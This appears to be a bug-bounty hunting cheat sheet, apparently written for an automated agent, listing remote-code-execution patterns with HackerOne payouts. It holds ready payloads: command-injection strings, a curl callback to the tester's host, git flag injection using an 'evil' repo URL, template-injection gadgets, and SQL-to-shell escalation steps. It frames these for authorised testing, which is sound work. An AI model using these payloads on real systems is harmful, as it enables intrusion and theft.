# RCE Archetypes — every $10K+ pattern from H1

> Curated from HackerOne TOPRCE, TOP100PAID, TOP100UPVOTED. Highest-EV first.

---

## ARCHETYPE 1 — Pre-auth RCE on edge hosts ($20K+)

**Pattern**: VPN portals, SSO gateways, marketing/support stacks, file-sync clients exposed publicly. They run *something* (Confluence, GitLab, Citrix, F5, Ivanti, Spring) that has a public CVE — and IT forgot to patch.

**Examples (H1):**
- Twitter VPN pre-auth RCE — $20,160
- Snapchat exposed Kubernetes API — $25,000
- Mail.ru unprotected Zeppelin — $35,000

**Hunt:**
```
nuclei -l live_hosts.txt -t cves/ -severity critical -rate-limit 30
```

Specifically watch for:
- Confluence (CVE-2022-26134, CVE-2023-22515, CVE-2023-22518)
- GitLab (CVE-2021-22205 ExifTool, CVE-2024-0402)
- Spring (CVE-2022-22965 Spring4Shell, CVE-2022-22963 Cloud Function)
- Atlassian Jira (CVE-2022-26136, CVE-2023-22501)
- Citrix NetScaler (CVE-2023-3519, CVE-2023-4966 CitrixBleed)
- Ivanti Connect Secure (CVE-2024-21887, CVE-2024-46805)
- F5 BIG-IP (CVE-2022-1388 iControl, CVE-2023-46747)
- VMware vCenter (CVE-2021-21972, CVE-2021-22005)
- WebLogic (CVE-2020-14882, CVE-2023-21839)
- Apache Struts (CVE-2017-5638, CVE-2023-50164)
- Log4j (CVE-2021-44228) — still alive on staging hosts

**Validate carefully**: many bounty programs require non-destructive PoC. Show the version banner + a benign read (e.g. id, hostname only on systems you confirm are non-prod, or read the first line of `/etc/passwd`).

---

## ARCHETYPE 2 — Dependency confusion ($30K PayPal)

See full deep-dive in `references/dependency-confusion.md`. Summary:

1. Find internal package names mentioned in JS bundles, source code, package.json/lock files, error messages, NPM/PyPI search hits.
2. Check if they are registered on the public registry. If not — register them.
3. Inject a benign callback (DNS or HTTP to your collaborator) in `postinstall` / `setup.py` / Gemfile equivalent.
4. Wait for the build agent to install it and ping you.

PayPal $30K. Apple, Microsoft, Tesla, Yelp all hit by the same researcher (Alex Birsan, 2021).

---

## ARCHETYPE 3 — Server-side template injection ($16K-$20K GitLab)

See `references/ssti-rce.md`. Quick smell test: insert `${{7*7}}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `{{= 7*7 }}` in:
- email subject/body fields (welcome, invite, password reset, invoices)
- markdown / wiki pages
- profile bio / org name / repo name fields
- error messages echoing user input
- name fields used in PDF/invoice generation

If you see `49` reflected — escalate to language-specific gadget chains.

---

## ARCHETYPE 4 — Unsafe deserialization ($20K Pornhub)

See `references/deserialization.md`. Hunt:
- Cookies that base64-decode to PHP `O:8:"stdClass"...` -> phpobject
- ViewState in .NET (`__VIEWSTATE`)
- Java `rO0AB` base64 prefix or `aced0005` hex (Java serialized stream magic)
- Node `_$$ND_FUNC$$_` or `node-serialize` patterns
- Ruby Marshal `\x04\x08`
- Python protocol-4 byte signature (`\x80\x04`)

---

## ARCHETYPE 5 — File upload to RCE ($18K Shopify Scripts)

See `references/file-upload-rce.md`. Recurring delivery vehicles:
- Image upload -> ImageMagick MSL -> RCE (CVE-2016-3714 ImageTragick)
- ImageMagick + Ghostscript on PDF/EPS -> RCE
- ExifTool on JPEG XMP -> RCE (CVE-2021-22204, GitLab $20K)
- ZIP slip in import features -> overwrite `.git/hooks/post-update`, cron, init scripts
- XSLT injection in document conversion
- Office macros on a server-side render
- SVG with embedded XSLT/XInclude
- Polyglot: GIF89a + PHP, JPEG + JS, PDF + JS

---

## ARCHETYPE 6 — Command injection in legacy params ($1K-$3K)

Lower payout per bug but easy. Hunt these param names:
```
host=, ip=, dest=, target=, ping=, lookup=, name=, file=, path=, url=, cmd=, query=, action=
```
And these endpoints:
```
/cgi-bin/, /admin/diagnostics, /api/v1/network, /system/, /tools/, /support/diag
```

**Test payloads** (URL-encode + escape carefully):
```
;sleep 10
| sleep 10
&& sleep 10
`sleep 10`
$(sleep 10)
%0Asleep 10           (newline injection)
';sleep 10;'         (in quoted contexts)
```

For **blind** detection use OAST: `;curl http://$YOU/$RANDOM` and watch your collaborator.

For **WAF-armored** targets see `cheatsheets/waf-bypass.md`.

---

## ARCHETYPE 7 — Import / migration features ($16K-$29K GitLab)

GitLab paid 4 different file-read RCEs in import flows. The pattern is:
- App accepts a `.tar.gz`, `.zip`, or remote URL "import"
- Internally extracts/clones/parses on a privileged host
- Bug: path traversal in extract, SSRF in URL fetch, git flag injection (`--upload-pack`), or template injection on metadata.

**Hunt**: Every "Import from", "Migrate", "Restore from backup", "Clone repo from URL" feature.

---

## ARCHETYPE 8 — XSLT / XML transform features

Document conversion (Word -> PDF, XLSX -> CSV, SVG -> PNG) frequently uses XSLT. XSLT permits:
```xml
<xsl:value-of select="document('/etc/passwd')"/>
<xsl:value-of select="system-property('xsl:vendor')"/>
<!-- Saxon-PE/EE -->
<xsl:value-of select="saxon:evaluate('Runtime.getRuntime() shell-via-runtime')"/>
```

---

## ARCHETYPE 9 — Git flag injection ($20K-$22K GitLab)

CVE-style: app passes user-controlled string to `git clone <user_input>`. Attacker passes `--upload-pack=...` or `--config=core.sshCommand=...` to run commands.

```
url=--upload-pack=touch /tmp/x
url=-c core.sshCommand=touch /tmp/x https://evil/repo.git
```

Also relevant: tar `--checkpoint-action=`, mysql `--init-command=`, ssh `-oProxyCommand=`.

---

## ARCHETYPE 10 — Markdown / formatter RCE

Kramdown options ($20K), Mermaid, Pandoc filters, AsciiDoctor includes, MkDocs plugins. The pattern: user-controlled markdown -> server-side renderer with eval-equivalent option.

GitLab Kramdown: `parser_options.template:` accepted a Ruby template path -> arbitrary file include.

---

## ARCHETYPE 11 — Misconfigured language eval features

- **Spring expression language (SpEL)**: `#{T(java.lang.Runtime).getRuntime() ... }` in any field rendered through SpEL.
- **OGNL** (Struts): `%{(#runtime=@java.lang.Runtime@getRuntime())...}`.
- **Jinja2** (Python): `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
- **EL** (Java): `${''.getClass().forName('java.lang.Runtime').getMethod(...)}`.
- **MVEL**, **JEXL**, **JEL**, **OGNL** — same family, similar payloads.

See `payloads/ssti-payloads.md`.

---

## ARCHETYPE 12 — SQLi -> RCE escalation

If you have SQLi (delegate to `sqli-hunter-agent`), still consider RCE escalation paths:
- MySQL: `INTO OUTFILE '/var/www/x.php'` if FILE priv + writeable webroot
- MSSQL: `xp_cmdshell` if sysadmin role
- Postgres: `COPY...FROM PROGRAM` (>=9.3, superuser), `lo_import`/`lo_export`, `CREATE FUNCTION ... LANGUAGE C`
- Oracle: Java stored procedures, `dbms_scheduler.create_job`
- SQLite: `ATTACH DATABASE` + write file inside webroot

---

## ARCHETYPE 13 — Protocol smuggling

- **gopher://** in SSRF -> Redis `CONFIG SET dir; SET x ...` -> cron RCE
- **dict://** for hash leaks
- **ftp://** with PASV abuse
- **file://** for file read (sometimes RCE via PHP wrappers)
- PHP wrappers: `php://filter/convert.base64-encode/resource=`, `phar://`, `expect://`, `data://text/plain;base64,...`

---

## ARCHETYPE 14 — Chained "low" -> RCE

The PayPal $20K stored XSS via cache poisoning is famous. Less obvious recipes:
- LFI + log poisoning -> PHP RCE (write payload to access log via UA, include via LFI)
- Open redirect on internal URL fetcher -> SSRF -> metadata -> cloud keys -> CodeBuild override -> RCE
- Sub-takeover -> set cookie on parent -> CSRF -> admin action -> command field -> RCE
- File upload (XSS-only) + admin endpoint that renders -> blind XSS in admin context -> CSRF admin to enable plugin -> plugin RCE

---

## VALIDATION CHECKLIST (do not skip)

1. Run benign command first (id, hostname, whoami).
2. Confirm output is server-side (echo a value derived from server time/UUID).
3. Note OS / user / sandbox status.
4. Test if you can reach internal services from the box (curl `127.0.0.1`).
5. Stop. Report. Do not exfil real data, do not pivot beyond what's needed for impact.
